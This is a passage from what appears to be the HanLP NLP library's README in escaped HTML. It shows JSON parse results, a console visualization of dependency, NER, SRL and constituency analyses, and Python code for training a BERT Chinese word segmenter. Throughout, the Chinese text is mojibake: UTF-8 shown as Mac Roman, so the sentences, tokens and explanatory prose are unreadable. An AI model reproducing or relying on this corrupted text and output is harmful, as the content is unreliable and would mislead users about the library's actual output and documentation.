[[10, &#34;mDegr&#34;]], [[15, &#34;Desc&#34;]], [[10, &#34;mAux&#34;]], [[8, &#34;Quan&#34;], [13, &#34;Quan&#34;]], [[15, &#34;Desc&#34;]], [[15, &#34;Nmod&#34;]], [[6, &#34;Pat&#34;]], [[6, &#34;mPunc&#34;]]],&#xA;    [[[2, &#34;Agt&#34;], [5, &#34;Agt&#34;]], [[0, &#34;Root&#34;]], [[4, &#34;Loc&#34;]], [[2, &#34;Lfin&#34;]], [[2, &#34;ePurp&#34;]], [[8, &#34;Nmod&#34;]], [[9, &#34;Nmod&#34;]], [[9, &#34;Nmod&#34;]], [[5, &#34;Datv&#34;]], [[5, &#34;mPunc&#34;]]]&#xA;  ],&#xA;  &#34;con&#34;: [&#xA;    [&#34;TOP&#34;, [[&#34;IP&#34;, [[&#34;NP&#34;, [[&#34;NT&#34;, [&#34;2021Âπ¥&#34;]]]], [&#34;NP&#34;, [[&#34;NR&#34;, [&#34;HanLPv2.1&#34;]]]], [&#34;VP&#34;, [[&#34;PP&#34;, [[&#34;P&#34;, [&#34;‰∏∫&#34;]], [&#34;NP&#34;, [[&#34;NN&#34;, [&#34;Áîü‰∫ß&#34;]], [&#34;NN&#34;, [&#34;ÁéØÂ¢É&#34;]]]]]], [&#34;VP&#34;, [[&#34;VV&#34;, [&#34;Â∏¶Êù•&#34;]], [&#34;NP&#34;, [[&#34;ADJP&#34;, [[&#34;NP&#34;, [[&#34;ADJP&#34;, [[&#34;JJ&#34;, [&#34;Ê¨°&#34;]]]], [&#34;NP&#34;, [[&#34;NN&#34;, [&#34;‰∏ñ‰ª£&#34;]]]]]], [&#34;ADVP&#34;, [[&#34;AD&#34;, [&#34;ÊúÄ&#34;]]]], [&#34;VP&#34;, [[&#34;JJ&#34;, [&#34;ÂÖàËøõ&#34;]]]]]], [&#34;DEG&#34;, [&#34;ÁöÑ&#34;]], [&#34;NP&#34;, [[&#34;QP&#34;, [[&#34;CD&#34;, [&#34;Â§ö&#34;]]]], [&#34;NP&#34;, [[&#34;NN&#34;, [&#34;ËØ≠Áßç&#34;]]]]]], [&#34;NP&#34;, [[&#34;NR&#34;, [&#34;NLP&#34;]], [&#34;NN&#34;, [&#34;ÊäÄÊúØ&#34;]]]]]]]]]], [&#34;PU&#34;, [&#34;„ÄÇ&#34;]]]]]],&#xA;    [&#34;TOP&#34;, [[&#34;IP&#34;, [[&#34;NP&#34;, [[&#34;NN&#34;, [&#34;ÈòøÂ©Ü‰∏ª&#34;]]]], [&#34;VP&#34;, [[&#34;VP&#34;, [[&#34;VV&#34;, [&#34;Êù•Âà∞&#34;]], [&#34;NP&#34;, [[&#34;NR&#34;, [&#34;Âåó‰∫¨&#34;]], [&#34;NR&#34;, [&#34;Á´ãÊñπÂ∫≠&#34;]]]]]], [&#34;VP&#34;, [[&#34;VV&#34;, [&#34;ÂèÇËßÇ&#34;]], [&#34;NP&#34;, [[&#34;NN&#34;, [&#34;Ëá™ÁÑ∂&#34;]], [&#34;NN&#34;, [&#34;ËØ≠‰πâ&#34;]], [&#34;NN&#34;, [&#34;ÁßëÊäÄ&#34;]], [&#34;NN&#34;, [&#34;ÂÖ¨Âè∏&#34;]]]]]]]], [&#34;PU&#34;, [&#34;„ÄÇ&#34;]]]]]]&#xA;  ]&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;ÁâπÂà´Âú∞ÔºåPython RESTfulÂíånative APIÊîØÊåÅÂü∫‰∫éÁ≠âÂÆΩÂ≠ó‰ΩìÁöÑ&lt;a href=&#34;https://hanlp.hankcs.com/docs/tutorial.html#visualization&#34;&gt;ÂèØËßÜÂåñ&lt;/a&gt;ÔºåËÉΩÂ§üÁõ¥Êé•Â∞ÜËØ≠Ë®ÄÂ≠¶ÁªìÊûÑÂú®ÊéßÂà∂Âè∞ÂÜÖÂèØËßÜÂåñÂá∫Êù•Ôºö&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;HanLP([&#39;2021Âπ¥HanLPv2.1‰∏∫Áîü‰∫ßÁéØÂ¢ÉÂ∏¶Êù•Ê¨°‰∏ñ‰ª£ÊúÄÂÖàËøõÁöÑÂ§öËØ≠ÁßçNLPÊäÄÊúØ„ÄÇ&#39;, &#39;ÈòøÂ©Ü‰∏ªÊù•Âà∞Âåó‰∫¨Á´ãÊñπÂ∫≠ÂèÇËßÇËá™ÁÑ∂ËØ≠‰πâÁßëÊäÄÂÖ¨Âè∏„ÄÇ&#39;]).pretty_print()&#xA;&#xA;Dep Tree    &#x9;Token    &#x9;Relati&#x9;PoS&#x9;Tok      &#x9;NER Type        &#x9;Tok      &#x9;SRL PA1     &#x9;Tok      &#x9;SRL PA2     &#x9;Tok      &#x9;PoS    3       4       5       6       7       8       9 &#xA;‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ&#x9;‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ&#x9;‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ&#x9;‚îÄ‚îÄ‚îÄ&#x9;‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ&#x9;‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ&#x9;‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ&#x9;‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ&#x9;‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ&#x9;‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ&#x9;‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ&#x9;‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ&#xA; ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ñ∫&#x9;2021Âπ¥    &#x9;tmod  &#x9;NT &#x9;2021Âπ¥    &#x9;‚îÄ‚îÄ‚îÄ‚ñ∫DATE        &#x9;2021Âπ¥    &#x9;‚îÄ‚îÄ‚îÄ‚ñ∫ARGM-TMP&#x9;2021Âπ¥    &#x9;            &#x9;2021Âπ¥    &#x9;NT ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ñ∫NP ‚îÄ‚îÄ‚îÄ‚îê   &#xA; ‚îÇ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ñ∫&#x9;HanLPv2.1&#x9;nsubj &#x9;NR &#x9;HanLPv2.1&#x9;‚îÄ‚îÄ‚îÄ‚ñ∫ORGANIZATION&#x9;HanLPv2.1&#x9;‚îÄ‚îÄ‚îÄ‚ñ∫ARG0    &#x9;HanLPv2.1&#x9;            &#x9;HanLPv2.1&#x9;NR ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ñ∫NP‚îÄ‚îÄ‚îÄ‚îÄ‚î§   &#xA; ‚îÇ‚îÇ‚îå‚îÄ‚ñ∫‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ&#x9;‰∏∫        &#x9;prep  &#x9;P  &#x9;‰∏∫        &#x9;                &#x9;‰∏∫        &#x9;‚óÑ‚îÄ‚îê         &#x9;‰∏∫        &#x9;            &#x9;‰∏∫        &#x9;P ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê                                       ‚îÇ   &#xA; ‚îÇ‚îÇ‚îÇ  ‚îÇ  ‚îå‚îÄ‚ñ∫&#x9;Áîü‰∫ß       &#x9;nn    &#x9;NN &#x9;Áîü‰∫ß       &#x9;                &#x9;Áîü‰∫ß       &#x9;  ‚îú‚ñ∫ARG2    &#x9;Áîü‰∫ß       &#x9;            &#x9;Áîü‰∫ß       &#x9;NN ‚îÄ‚îÄ‚îê       ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ñ∫PP ‚îÄ‚îÄ‚îÄ‚îê       ‚îÇ   &#xA; ‚îÇ‚îÇ‚îÇ  ‚îî‚îÄ‚ñ∫‚îî‚îÄ‚îÄ&#x9;ÁéØÂ¢É       &#x9;pobj  &#x9;NN &#x9;ÁéØÂ¢É       &#x9;                &#x9;ÁéØÂ¢É       &#x9;‚óÑ‚îÄ‚îò         &#x9;ÁéØÂ¢É       &#x9;            &#x9;ÁéØÂ¢É       &#x9;NN ‚îÄ‚îÄ‚î¥‚ñ∫NP ‚îÄ‚îÄ‚îÄ‚îò                               ‚îÇ       ‚îÇ   &#xA;‚îå‚îº‚î¥‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ&#x9;Â∏¶Êù•       &#x9;root  &#x9;VV &#x9;Â∏¶Êù•       &#x9;                &#x9;Â∏¶Êù•       &#x9;‚ïü‚îÄ‚îÄ‚ñ∫PRED    &#x9;Â∏¶Êù•       &#x9;            &#x9;Â∏¶Êù•       &#x9;VV ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê       ‚îÇ       ‚îÇ   &#xA;‚îÇ‚îÇ       ‚îå‚îÄ‚ñ∫&#x9;Ê¨°        &#x9;amod  &#x9;JJ &#x9;Ê¨°        &#x9;                &#x9;Ê¨°        &#x9;‚óÑ‚îÄ‚îê         &#x9;Ê¨°        &#x9;            &#x9;Ê¨°        &#x9;JJ ‚îÄ‚îÄ‚îÄ‚ñ∫ADJP‚îÄ‚îÄ‚îê                       ‚îÇ       ‚îú‚ñ∫VP‚îÄ‚îÄ‚îÄ‚îÄ‚î§   &#xA;‚îÇ‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚ñ∫‚îî‚îÄ‚îÄ&#x9;‰∏ñ‰ª£       &#x9;nn    &#x9;NN &#x9;‰∏ñ‰ª£       &#x9;                &#x9;‰∏ñ‰ª£       &#x9;  ‚îÇ         &#x9;‰∏ñ‰ª£       &#x9;            &#x9;‰∏ñ‰ª£       &#x9;NN ‚îÄ‚îÄ‚îÄ‚ñ∫NP ‚îÄ‚îÄ‚îÄ‚î¥‚ñ∫NP ‚îÄ‚îÄ‚îÄ‚îê               ‚îÇ       ‚îÇ       ‚îÇ   &#xA;‚îÇ‚îÇ  ‚îÇ    ‚îå‚îÄ‚ñ∫&#x9;ÊúÄ        &#x9;advmod&#x9;AD &#x9;ÊúÄ        &#x9;                &#x9;ÊúÄ        &#x9;  ‚îÇ         &#x9;ÊúÄ        &#x9;‚îÄ‚îÄ‚îÄ‚ñ∫ARGM-ADV&#x9;ÊúÄ        &#x9;AD ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ñ∫ADVP‚îÄ‚îÄ‚îº‚ñ∫ADJP‚îÄ‚îÄ‚îê       ‚îú‚ñ∫VP ‚îÄ‚îÄ‚îÄ‚îò       ‚îú‚ñ∫IP&#xA;‚îÇ‚îÇ  ‚îÇ‚îå‚îÄ‚îÄ‚ñ∫‚îú‚îÄ‚îÄ&#x9;ÂÖàËøõ       &#x9;rcmod &#x9;JJ &#x9;ÂÖàËøõ       &#x9;                &#x9;ÂÖàËøõ       &#x9;  ‚îÇ         &#x9;ÂÖàËøõ       &#x9;‚ïü‚îÄ‚îÄ‚ñ∫PRED    &#x9;ÂÖàËøõ       &#x9;JJ ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ñ∫VP ‚îÄ‚îÄ‚îÄ‚îò       ‚îÇ       ‚îÇ               ‚îÇ   &#xA;‚îÇ‚îÇ  ‚îÇ‚îÇ   ‚îî‚îÄ‚ñ∫&#x9;ÁöÑ        &#x9;assm  &#x9;DEG&#x9;ÁöÑ        &#x9;                &#x9;ÁöÑ        &#x9;  ‚îú‚ñ∫ARG1    &#x9;ÁöÑ        &#x9;            &#x9;ÁöÑ        &#x9;DEG‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§       ‚îÇ               ‚îÇ   &#xA;‚îÇ‚îÇ  ‚îÇ‚îÇ   ‚îå‚îÄ‚ñ∫&#x9;Â§ö        &#x9;nummod&#x9;CD &#x9;Â§ö        &#x9;                &#x9;Â§ö        &#x9;  ‚îÇ         &#x9;Â§ö        &#x9;            &#x9;Â§ö        &#x9;CD ‚îÄ‚îÄ‚îÄ‚ñ∫QP ‚îÄ‚îÄ‚îÄ‚îê               ‚îú‚ñ∫NP ‚îÄ‚îÄ‚îÄ‚îò               ‚îÇ   &#xA;‚îÇ‚îÇ  ‚îÇ‚îÇ‚îå‚îÄ‚ñ∫‚îî‚îÄ‚îÄ&#x9;ËØ≠Áßç       &#x9;nn    &#x9;NN &#x9;ËØ≠Áßç       &#x9;                &#x9;ËØ≠Áßç       &#x9;  ‚îÇ         &#x9;ËØ≠Áßç       &#x9;            &#x9;ËØ≠Áßç       &#x9;NN ‚îÄ‚îÄ‚îÄ‚ñ∫NP ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ñ∫NP‚îÄ‚îÄ‚îÄ‚îÄ‚î§                       ‚îÇ   &#xA;‚îÇ‚îÇ  ‚îÇ‚îÇ‚îÇ  ‚îå‚îÄ‚ñ∫&#x9;NLP      &#x9;nn    &#x9;NR &#x9;NLP      &#x9;                &#x9;NLP      &#x9;  ‚îÇ         &#x9;NLP      &#x9;            &#x9;NLP      &#x9;NR ‚îÄ‚îÄ‚îê                       ‚îÇ                       ‚îÇ   &#xA;‚îÇ‚îî‚îÄ‚ñ∫‚îî‚î¥‚î¥‚îÄ‚îÄ‚î¥‚îÄ‚îÄ&#x9;ÊäÄÊúØ       &#x9;dobj  &#x9;NN &#x9;ÊäÄÊúØ       &#x9;                &#x9;ÊäÄÊúØ       &#x9;‚óÑ‚îÄ‚îò         &#x9;ÊäÄÊúØ       &#x9;‚îÄ‚îÄ‚îÄ‚ñ∫ARG0    &#x9;ÊäÄÊúØ       &#x9;NN ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ñ∫NP ‚îÄ‚îÄ‚îÄ‚îò                       ‚îÇ   &#xA;‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ñ∫&#x9;„ÄÇ        &#x9;punct &#x9;PU &#x9;„ÄÇ        &#x9;                &#x9;„ÄÇ        &#x9;            &#x9;„ÄÇ        &#x9;            &#x9;„ÄÇ        &#x9;PU ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò   &#xA;&#xA;Dep Tree    &#x9;Tok&#x9;Relat&#x9;Po&#x9;Tok&#x9;NER Type        &#x9;Tok&#x9;SRL PA1 &#x9;Tok&#x9;SRL PA2 &#x9;Tok&#x9;Po    3       4       5       6 &#xA;‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ&#x9;‚îÄ‚îÄ‚îÄ&#x9;‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ&#x9;‚îÄ‚îÄ&#x9;‚îÄ‚îÄ‚îÄ&#x9;‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ&#x9;‚îÄ‚îÄ‚îÄ&#x9;‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ&#x9;‚îÄ‚îÄ‚îÄ&#x9;‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ&#x9;‚îÄ‚îÄ‚îÄ&#x9;‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ&#xA;         ‚îå‚îÄ‚ñ∫&#x9;ÈòøÂ©Ü‰∏ª&#x9;nsubj&#x9;NN&#x9;ÈòøÂ©Ü‰∏ª&#x9;                &#x9;ÈòøÂ©Ü‰∏ª&#x9;‚îÄ‚îÄ‚îÄ‚ñ∫ARG0&#x9;ÈòøÂ©Ü‰∏ª&#x9;‚îÄ‚îÄ‚îÄ‚ñ∫ARG0&#x9;ÈòøÂ©Ü‰∏ª&#x9;NN‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ñ∫NP ‚îÄ‚îÄ‚îÄ‚îê   &#xA;‚îå‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚î¥‚îÄ‚îÄ&#x9;Êù•Âà∞ &#x9;root &#x9;VV&#x9;Êù•Âà∞ &#x9;                &#x9;Êù•Âà∞ &#x9;‚ïü‚îÄ‚îÄ‚ñ∫PRED&#x9;Êù•Âà∞ &#x9;        &#x9;Êù•Âà∞ &#x9;VV‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê               ‚îÇ   &#xA;‚îÇ‚îÇ    ‚îÇ  ‚îå‚îÄ‚ñ∫&#x9;Âåó‰∫¨ &#x9;nn   &#x9;NR&#x9;Âåó‰∫¨ &#x9;‚îÄ‚îÄ‚îÄ‚ñ∫LOCATION    &#x9;Âåó‰∫¨ &#x9;‚óÑ‚îÄ‚îê     &#x9;Âåó‰∫¨ &#x9;        &#x9;Âåó‰∫¨ &#x9;NR‚îÄ‚îÄ‚îê       ‚îú‚ñ∫VP ‚îÄ‚îÄ‚îÄ‚îê       ‚îÇ   &#xA;‚îÇ‚îÇ    ‚îî‚îÄ‚ñ∫‚îî‚îÄ‚îÄ&#x9;Á´ãÊñπÂ∫≠&#x9;dobj &#x9;NR&#x9;Á´ãÊñπÂ∫≠&#x9;‚îÄ‚îÄ‚îÄ‚ñ∫LOCATION    &#x9;Á´ãÊñπÂ∫≠&#x9;‚óÑ‚îÄ‚î¥‚ñ∫ARG1&#x9;Á´ãÊñπÂ∫≠&#x9;        &#x9;Á´ãÊñπÂ∫≠&#x9;NR‚îÄ‚îÄ‚î¥‚ñ∫NP ‚îÄ‚îÄ‚îÄ‚îò       ‚îÇ       ‚îÇ   &#xA;‚îÇ‚îî‚îÄ‚ñ∫‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ&#x9;ÂèÇËßÇ &#x9;conj &#x9;VV&#x9;ÂèÇËßÇ &#x9;                &#x9;ÂèÇËßÇ &#x9;        &#x9;ÂèÇËßÇ &#x9;‚ïü‚îÄ‚îÄ‚ñ∫PRED&#x9;ÂèÇËßÇ &#x9;VV‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê       ‚îú‚ñ∫VP‚îÄ‚îÄ‚îÄ‚îÄ‚î§   &#xA;‚îÇ   ‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚ñ∫&#x9;Ëá™ÁÑ∂ &#x9;nn   &#x9;NN&#x9;Ëá™ÁÑ∂ &#x9;‚óÑ‚îÄ‚îê             &#x9;Ëá™ÁÑ∂ &#x9;        &#x9;Ëá™ÁÑ∂ &#x9;‚óÑ‚îÄ‚îê     &#x9;Ëá™ÁÑ∂ &#x9;NN‚îÄ‚îÄ‚îê       ‚îÇ       ‚îÇ       ‚îú‚ñ∫IP&#xA;‚îÇ   ‚îÇ  ‚îÇ‚îå‚îÄ‚îÄ‚ñ∫&#x9;ËØ≠‰πâ &#x9;nn   &#x9;NN&#x9;ËØ≠‰πâ &#x9;  ‚îÇ             &#x9;ËØ≠‰πâ &#x9;        &#x9;ËØ≠‰πâ &#x9;  ‚îÇ     &#x9;ËØ≠‰πâ &#x9;NN  ‚îÇ       ‚îú‚ñ∫VP ‚îÄ‚îÄ‚îÄ‚îò       ‚îÇ   &#xA;‚îÇ   ‚îÇ  ‚îÇ‚îÇ‚îå‚îÄ‚ñ∫&#x9;ÁßëÊäÄ &#x9;nn   &#x9;NN&#x9;ÁßëÊäÄ &#x9;  ‚îú‚ñ∫ORGANIZATION&#x9;ÁßëÊäÄ &#x9;        &#x9;ÁßëÊäÄ &#x9;  ‚îú‚ñ∫ARG1&#x9;ÁßëÊäÄ &#x9;NN  ‚îú‚ñ∫NP ‚îÄ‚îÄ‚îÄ‚îò               ‚îÇ   &#xA;‚îÇ   ‚îî‚îÄ‚ñ∫‚îî‚î¥‚î¥‚îÄ‚îÄ&#x9;ÂÖ¨Âè∏ &#x9;dobj &#x9;NN&#x9;ÂÖ¨Âè∏ &#x9;‚óÑ‚îÄ‚îò             &#x9;ÂÖ¨Âè∏ &#x9;        &#x9;ÂÖ¨Âè∏ &#x9;‚óÑ‚îÄ‚îò     &#x9;ÂÖ¨Âè∏ &#x9;NN‚îÄ‚îÄ‚îò                       ‚îÇ   &#xA;‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ñ∫&#x9;„ÄÇ  &#x9;punct&#x9;PU&#x9;„ÄÇ  &#x9;                &#x9;„ÄÇ  &#x9;        &#x9;„ÄÇ  &#x9;        &#x9;„ÄÇ  &#x9;PU‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò   &#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;ÂÖ≥‰∫éÊ†áÊ≥®ÈõÜÂê´‰πâÔºåËØ∑ÂèÇËÄÉ&lt;a href=&#34;https://hanlp.hankcs.com/docs/annotations/index.html&#34;&gt;„ÄäËØ≠Ë®ÄÂ≠¶Ê†áÊ≥®ËßÑËåÉ„Äã&lt;/a&gt;Âèä&lt;a href=&#34;https://hanlp.hankcs.com/docs/data_format.html&#34;&gt;„ÄäÊ†ºÂºèËßÑËåÉ„Äã&lt;/a&gt;„ÄÇÊàë‰ª¨Ë¥≠‰π∞„ÄÅÊ†áÊ≥®ÊàñÈááÁî®‰∫Ü‰∏ñÁïå‰∏äÈáèÁ∫ßÊúÄÂ§ß„ÄÅÁßçÁ±ªÊúÄÂ§öÁöÑËØ≠ÊñôÂ∫ìÁî®‰∫éËÅîÂêàÂ§öËØ≠ÁßçÂ§ö‰ªªÂä°Â≠¶‰π†ÔºåÊâÄ‰ª•HanLPÁöÑÊ†áÊ≥®ÈõÜ‰πüÊòØË¶ÜÁõñÈù¢ÊúÄÂπøÁöÑ„ÄÇ&lt;/p&gt; &#xA;&lt;h2&gt;ËÆ≠ÁªÉ‰Ω†Ëá™Â∑±ÁöÑÈ¢ÜÂüüÊ®°Âûã&lt;/h2&gt; &#xA;&lt;p&gt;ÂÜôÊ∑±Â∫¶Â≠¶‰π†Ê®°Âûã‰∏ÄÁÇπÈÉΩ‰∏çÈöæÔºåÈöæÁöÑÊòØÂ§çÁé∞ËæÉÈ´òÁöÑÂáÜÁ°ÆÁéá„ÄÇ‰∏ãÂàó&lt;a href=&#34;https://github.com/hankcs/HanLP/raw/master/plugins/hanlp_demo/hanlp_demo/zh/train_sota_bert_pku.py&#34;&gt;‰ª£Á†Å&lt;/a&gt;Â±ïÁ§∫‰∫ÜÂ¶Ç‰ΩïÂú®sighan2005 PKUËØ≠ÊñôÂ∫ì‰∏äËä±6ÂàÜÈíüËÆ≠ÁªÉ‰∏Ä‰∏™Ë∂ÖË∂äÂ≠¶ÊúØÁïåstate-of-the-artÁöÑ‰∏≠ÊñáÂàÜËØçÊ®°Âûã„ÄÇ&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;tokenizer = TransformerTaggingTokenizer()&#xA;save_dir = &#39;data/model/cws/sighan2005_pku_bert_base_96.70&#39;&#xA;tokenizer.fit(&#xA;    SIGHAN2005_PKU_TRAIN_ALL,&#xA;    SIGHAN2005_PKU_TEST,  # Conventionally, no devset is used. See Tian et al. (2020).&#xA;    save_dir,&#xA;    &#39;bert-base-chinese&#39;,&#xA;    max_seq_len=300,&#xA;    char_level=True,&#xA;    hard_constraint=True,&#xA;    sampler_builder=SortingSamplerBuilder(batch_size=32),&#xA;    epochs=3,&#xA;    adam_epsilon=1e-6,&#xA;    warmup_steps=0.1,&#xA;    weight_decay=0.01,&#xA;    word_dropout=0.1,&#xA;    seed=1609836303,&#xA;)&#xA;tokenizer.evaluate(SIGHAN2005_PKU_TEST, save_dir)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;ÂÖ∂‰∏≠ÔºåÁî±‰∫éÊåáÂÆö‰∫ÜÈöèÊú∫Êï∞ÁßçÂ≠êÔºåÁªìÊûú‰∏ÄÂÆöÊòØ&lt;code&gt;96.70&lt;/code&gt;„ÄÇ‰∏çÂêå‰∫éÈÇ£‰∫õËôöÂÅáÂÆ£‰º†ÁöÑÂ≠¶ÊúØËÆ∫ÊñáÊàñÂïÜ‰∏öÈ°πÁõÆÔºåHanLP‰øùËØÅÊâÄÊúâÁªìÊûúÂèØÂ§çÁé∞„ÄÇÂ¶ÇÊûú‰Ω†Êúâ‰ªª‰ΩïË¥®ÁñëÔºåÊàë‰ª¨Â∞ÜÂΩì‰ΩúÊúÄÈ´ò‰ºòÂÖàÁ∫ßÁöÑËá¥ÂëΩÊÄßbugÁ¨¨‰∏ÄÊó∂Èó¥ÊéíÊü•ÈóÆÈ¢ò„ÄÇ&lt;/p&gt; &#xA;&lt;p&gt;ËØ∑ÂèÇËÄÉ&lt;a 